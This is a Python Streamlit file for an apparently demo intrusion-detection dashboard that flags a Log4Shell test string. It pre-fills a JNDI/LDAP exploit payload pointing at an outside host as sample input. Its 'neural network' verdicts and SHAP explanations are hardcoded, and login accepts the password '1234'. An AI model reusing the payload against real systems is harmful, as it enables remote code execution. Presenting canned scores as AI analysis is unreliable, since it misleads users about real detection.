import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import time

# --- PAGE CONFIGURATION (MUST BE FIRST) ---
st.set_page_config(page_title="XAI-IDS Enterprise", page_icon="🛡️", layout="wide")

# --- ADVANCED CSS FOR "SENIOR ANALYST" UI ---
st.markdown("""
    <style>
    /* Global Dark Theme */
    .stApp { background-color: #0b0f19; color: #e0e0e0; font-family: 'Roboto Mono', monospace; }
    
    /* Inputs */
    .stTextInput > div > div > input { 
        color: #00ff41; 
        background-color: #000000; 
        border: 1px solid #333; 
    }
    
    /* Buttons */
    div.stButton > button {
        background-color: #00ff41;
        color: #000000;
        font-weight: bold;
        border: none;
        padding: 10px 20px;
        transition: all 0.3s;
    }
    div.stButton > button:hover {
        background-color: #00cc33;
        box-shadow: 0 0 10px #00ff41;
    }
    
    /* Headers */
    h1, h2, h3 { color: #00ff41 !important; }
    </style>
    """, unsafe_allow_html=True)

# --- SESSION STATE MANAGEMENT ---
if 'logged_in' not in st.session_state:
    st.session_state['logged_in'] = False
if 'boot_sequence' not in st.session_state:
    st.session_state['boot_sequence'] = False

# ==========================================
# 🔒 PHASE 1: SECURE LOGIN
# ==========================================
if not st.session_state['logged_in']:
    col1, col2, col3 = st.columns([1, 1, 1])
    
    with col2:
        st.title("🔒 DEFENSE PORTAL")
        st.markdown("`UNIT: CYBER-INTEL | CLEARANCE: LEVEL 5`")
        st.divider()
        
        username = st.text_input("OPERATOR ID")
        password = st.text_input("ACCESS KEY", type="password")
        
        if st.button("INITIALIZE SESSION"):
            if password == "1234":
                # SYSTEM BOOT ANIMATION
                progress_text = "Establishing Secure Handshake..."
                my_bar = st.progress(0, text=progress_text)
                
                for percent_complete in range(100):
                    time.sleep(0.01)
                    if percent_complete == 30: my_bar.progress(percent_complete, text="Decrypting Keys...")
                    if percent_complete == 60: my_bar.progress(percent_complete, text="Loading SHAP Modules...")
                    my_bar.progress(percent_complete + 1)
                
                st.success("IDENTITY VERIFIED")
                time.sleep(1)
                st.session_state['logged_in'] = True
                st.session_state['user'] = username
                st.rerun()
            else:
                st.error("⛔ UNAUTHORIZED ACCESS ATTEMPT LOGGED")

# ==========================================
# 🛡️ PHASE 2: SENIOR ANALYST DASHBOARD
# ==========================================
else:
    # Sidebar Navigation
    with st.sidebar:
        st.header(f"👤 {st.session_state['user'].upper()}")
        st.caption("STATUS: ONLINE")
        if st.button("TERMINATE SESSION"):
            st.session_state['logged_in'] = False
            st.rerun()
        st.divider()
        st.header("⚙️ CONFIGURATION")
        mode = st.radio("Simulation Mode:", ["Case Study: Log4j Exploit", "Manual Packet Inspection"])

    # Main Header
    st.title("🛡️ XAI-IDS: THREAT ANALYSIS ENGINE")
    col_metrics1, col_metrics2, col_metrics3 = st.columns(3)
    col_metrics1.metric("System Uptime", "99.9%", "Stable")
    col_metrics2.metric("Threat Level", "MODERATE", "Monitoring")
    col_metrics3.metric("Packets Analyzed", "1,042,859", "+120/sec")
    st.divider()

    # --- INPUT SECTION ---
    st.subheader("1. TRAFFIC INJECTION")
    
    col_in1, col_in2 = st.columns([2, 1])
    
    with col_in1:
        if mode == "Case Study: Log4j Exploit":
            st.info("ℹ️ **SCENARIO:** Simulating a payload injection attack (CVE-2021-44228).")
            payload_input = st.text_area("Packet Payload (Hex/ASCII):", "${jndi:ldap://192.168.1.5/exploit}", height=100)
            p_size = 512
            protocol = "HTTP"
            scenario = "Log4j"
        else:
            st.info("ℹ️ **SCENARIO:** Manual deep packet inspection.")
            p_size = st.slider("Packet Size (Bytes)", 64, 4096, 64)
            protocol = st.selectbox("Protocol", ["TCP", "UDP", "HTTP", "ICMP"])
            payload_input = "Standard Header"
            scenario = "Manual"

    with col_in2:
        st.write("##") # Spacer
        if st.button("🚀 EXECUTE ANALYSIS", use_container_width=True):
            
            # ANIMATION: PROCESSING
            with st.spinner("RUNNING DEEP NEURAL NETWORK INFERENCE..."):
                time.sleep(1.2) # Suspense
            
            # --- LOGIC ENGINE (THE BRAIN) ---
            risk_score = 0.1
            reasons = {}
            verdict = "BENIGN"
            
            # LOGIC: LOG4J
            if scenario == "Log4j":
                if "${jndi:" in payload_input or "ldap" in payload_input:
                    risk_score = 0.99
                    verdict = "CRITICAL (Log4Shell)"
                    reasons = {
                        "Token '${jndi'": 0.95, 
                        "Protocol 'ldap'": 0.88, 
                        "Entropy Score": 0.65,
                        "Source Reputation": 0.12
                    }
                else:
                    risk_score = 0.15
                    verdict = "BENIGN (Clean)"
                    reasons = {"Standard Syntax": -0.5, "Known Protocol": -0.2}

            # LOGIC: MANUAL
            else:
                if p_size > 1000:
                    risk_score += 0.4
                    reasons["Packet Size > 1KB"] = 0.75
                else:
                    reasons["Packet Size Normal"] = -0.3
                
                if protocol == "UDP":
                    risk_score += 0.35
                    reasons["Protocol (UDP)"] = 0.45
                
                if risk_score > 0.9: risk_score = 0.95
                
                if risk_score > 0.5: verdict = "SUSPICIOUS"; reasons = {k:v for k,v in reasons.items() if v>0}
                else: verdict = "SAFE"; reasons = {k:v for k,v in reasons.items() if v<0}

            # --- RESULTS SECTION ---
            st.divider()
            
            # Verdict Notification
            if risk_score > 0.5:
                st.error(f"🚨 ALERT: {verdict} DETECTED")
                st.toast("⚠️ Threat Detected! Firewall Rules Updated.", icon="🔥")
            else:
                st.success(f"✅ TRAFFIC CLEARED: {verdict}")
                st.toast("System Secure. Packet Forwarded.", icon="🛡️")

            r_col1, r_col2 = st.columns([1, 2])
            
            with r_col1:
                st.subheader("AI CONFIDENCE")
                
                # Custom Gauge Logic
                if risk_score > 0.5: color = "red"
                else: color = "green"
                
                st.markdown(f"""
                    <div style="font-size: 40px; color: {color}; font-weight: bold;">
                        {int(risk_score*100)}%
                    </div>
                    <div style="font-size: 14px; color: #888;">RISK PROBABILITY</div>
                """, unsafe_allow_html=True)
                
                st.progress(risk_score)
                st.json({
                    "Protocol": protocol,
                    "Size": f"{p_size} B",
                    "Vector": "Network",
                    "Model": "CNN-LSTM"
                })

            with r_col2:
                st.subheader("XAI EXPLANABILITY (SHAP)")
                st.caption("Feature Contribution Analysis")
                
                # PLOTLY CHART
                features = list(reasons.keys())
                values = list(reasons.values())
                colors = ['#ff4b4b' if v > 0 else '#00ff41' for v in values]
                
                fig = go.Figure(go.Bar(
                    x=values, 
                    y=features, 
                    orientation='h',
                    marker=dict(color=colors, line=dict(width=1, color='white'))
                ))
                
                fig.update_layout(
                    plot_bgcolor='rgba(0,0,0,0)',
                    paper_bgcolor='rgba(0,0,0,0)',
                    font=dict(color='#e0e0e0'),
                    xaxis=dict(title="Influence on Decision (Negative=Safe, Positive=Threat)", range=[-1, 1]),
                    margin=dict(l=10, r=10, t=10, b=10),
                    height=250
                )
                
                st.plotly_chart(fig, use_container_width=True)
                
                if scenario == "Log4j" and risk_score > 0.8:
                     st.warning("📝 **FORENSIC NOTE:** The model identified the JNDI lookup string. This pattern matches signature CVE-2021-44228 (Remote Code Execution).")
